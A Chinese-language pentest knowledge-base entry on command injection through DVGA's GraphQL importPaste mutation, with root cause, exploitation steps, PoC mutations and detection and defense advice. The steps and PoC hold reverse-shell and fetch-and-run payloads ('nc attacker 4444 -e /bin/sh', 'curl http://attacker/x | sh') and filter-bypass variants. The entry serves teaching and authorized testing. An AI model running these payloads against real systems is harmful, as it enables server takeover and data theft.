---
id: web-generic-graphql-importpaste-command-injection
title: GraphQL importPaste 命令注入：host/port/path/scheme 拼进 curl，path=/; sleep 10 在服务端执行任意命令
type: scenario
domain: web
path: web/generic/graphql
technique: graphql-importpaste-curl-command-injection
tags:
- graphql
- command-injection
- rce
- mutation
- curl
- dvga
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V304
  verified_at: '2026-11-08T11:52:55+08:00'
  notes: 已对照 content.md 与 img33-35 核对：importPaste(host,port,path,scheme)、strip_dangerous_characters 后仍执行 helpers.run_cmd(f'curl --insecure {url}')、path=/; sleep 10、ps 可见 PID 36 sleep 10 均与原文一致。未验证点：原文未给出 strip_dangerous_characters 具体字符表，未实际复现 RCE。
url: /docs/web/generic/graphql/web-generic-graphql-importpaste-command-injection/
draft: false
kb_aliases:
- GraphQL 命令注入
- importPaste RCE
- curl URL 拼接注入
- DVGA importPaste
- GraphQL mutation RCE
- sleep 10 验证
---

## 一句话结论

GraphQL 的 `importPaste(host, port, path, scheme)` mutation 在 resolver 里用这些参数拼出 URL，再执行 `curl --insecure {url}`；把 `path` 从 `/` 改成 `/; sleep 10`，最终 shell 执行的命令变成 `curl --insecure http://example.com:80/; sleep 10`，分号让第二条命令 `sleep 10` 也被执行（文章用 `ps` 看到 `sleep 10` 进程），攻击者可将 sleep 换成任意命令获得 RCE。

## 原理

- **参数拼进 shell 命令**：文章源码 `url = security.strip_dangerous_characters(f"{scheme}://{host}:{port}{path}")`，然后 `cmd = helpers.run_cmd(f'curl --insecure {url}')`。`host/port/path/scheme` 全部来自 GraphQL mutation 参数，攻击者可控；`run_cmd` 若用 shell 执行（如 `subprocess` shell=True 或 `os.system`），命令字符串中的 shell 元字符会被解释。
- **黑名单不完整**：`strip_dangerous_characters` 只移除部分“危险字符”，但未覆盖 `;`（或可通过编码/大小写/替代分隔符绕过），因此 `path="/; sleep 10"` 中的分号保留，URL 变成 `http://example.com:80/; sleep 10`，`curl` 只请求到 `/`，分号后 `sleep 10` 作为新命令执行。
- **为什么能确认执行**：文章在服务端 `ps` 看到 `sleep 10` 进程（PID 36），说明 shell 确实是命令解释器，而不是把参数作为单个 argv 传给 `curl`；这为任意命令执行（反弹 shell、下载载荷、读文件外带）提供了直接原语。
- **影响**：RCE 可导致服务器完全失陷：窃取数据、横向移动、部署后门、挖矿/勒索；若服务以容器/低权运行，影响受权限限制，但仍可读应用数据/内网探测。
- **GraphQL 特有风险**：schema introspection 会直接暴露 `importPaste` 这类“导入 URL”的 mutation；很多 GraphQL 网关只做查询复杂度/鉴权，不审计 resolver 里的命令拼接。

## 触发条件

- GraphQL schema 暴露类似 `importPaste(host, port, path, scheme)` 的 mutation，resolver 使用 shell 执行 curl/wget 等命令。
- 命令参数来自用户输入且未经严格校验；存在不完整的黑名单或只过滤部分字符（如引号），未禁止 `;`、`|`、`&&`、`$()`、反引号、换行。
- `run_cmd` 使用 shell 解释（os.system/subprocess shell=True），而不是 argv 数组直接 exec。
- 攻击者可发送自定义 GraphQL mutation；目标出网/或命令不依赖出网（sleep、写入文件等）。

## 利用步骤

1. introspection/字段建议找到 `importPaste` mutation 及其参数 `host/port/path/scheme`，先用正常参数（`host:"example.com", port:80, path:"/", scheme:"http"`）确认功能。
2. 构造时间盲注验证：`path:"/; sleep 10"`，发送 mutation，测量响应时间是否增加约 10 秒；同时可在服务端 `ps` 看到 `sleep 10`（文章验证）。
3. 替换为任意命令：`path:"/; id"`、`path:"/; nc attacker 4444 -e /bin/sh"`、`path:"/; curl http://attacker/x | sh"`；若输出不回显，用带外通道（DNS/HTTP/反弹 shell）。
4. 若 `;` 被过滤，尝试 `|`、`||`、`&&`、`$()`、反引号、换行、编码/大小写变体；也可在 host/port/scheme 中注入（取决于拼接位置）。
5. 确认权限/容器边界，评估持久化、内网横向与数据外带；清理测试进程/文件。

## PoC

```graphql
# 正常请求
mutation {
  importPaste(host: "example.com", port: 80, path: "/", scheme: "http") {
    result
  }
}

# 命令注入（时间验证）
mutation {
  importPaste(host: "example.com", port: 80, path: "/; sleep 10", scheme: "http") {
    result
  }
}
```

```text
# resolver 拼接结果
url = http://example.com:80/; sleep 10
cmd = curl --insecure http://example.com:80/; sleep 10
# shell 执行 curl 后继续执行 sleep 10（文章 ps 可见 PID 36 sleep 10）
```

```graphql
# 反弹 shell（示意，替换为授权目标）
mutation {
  importPaste(host: "example.com", port: 80,
              path: "/; nc 10.0.0.5 4444 -e /bin/sh", scheme: "http") {
    result
  }
}
```

## 变体与关联

- 变体：注入点可能在 `host`/`port`/`scheme`（如 `host:"example.com; id"`、`scheme:"http$(id)"`），需按实际拼接顺序测试；`path` 只是文章示例。
- 变体：黑名单过滤 `;` 时用 `|`、`&&`、`$IFS`、换行（`%0a`）、反引号、`$()`；若命令在引号内，需先闭合引号。
- 变体：无回显时用 sleep/时间盲注、DNSLog、HTTP 回连、写文件到 Web 目录后访问；也可用 `curl` 下载恶意脚本再执行。
- 关联：[[web-generic-graphql-upload-path-traversal-arbitrary-write]]（同 schema 的文件写入 mutation）、[[web-generic-graphql-endpoint-discovery-schema-enumeration]]（发现 importPaste）、[[web-python-django-login-eval-base64-user-input-rce]]（Python Web 用户输入进 eval/shell 的同类 RCE）。

## 检测与防御

- 检测：审计 resolver 中的 `os.system/subprocess(shell=True)/run_cmd` 与字符串拼接；监控包含 `;`、`|`、`$(`、反引号、换行的 GraphQL 参数；对 `sleep`/curl 子进程做异常检测。
- 防御：不要用 shell 执行外部命令；用 HTTP 客户端库（requests/urllib）替代 curl，或 `subprocess.run([...], shell=False)` 传 argv 数组；对 host/scheme/path 做严格白名单/URL 解析；限制出网（egress firewall）；以低权限/容器运行 resolver；禁用不必要的 import mutation。
- 说明：本文是 GraphQL mutation 命令注入 RCE 场景，severity 记为 high；仅用于授权测试。
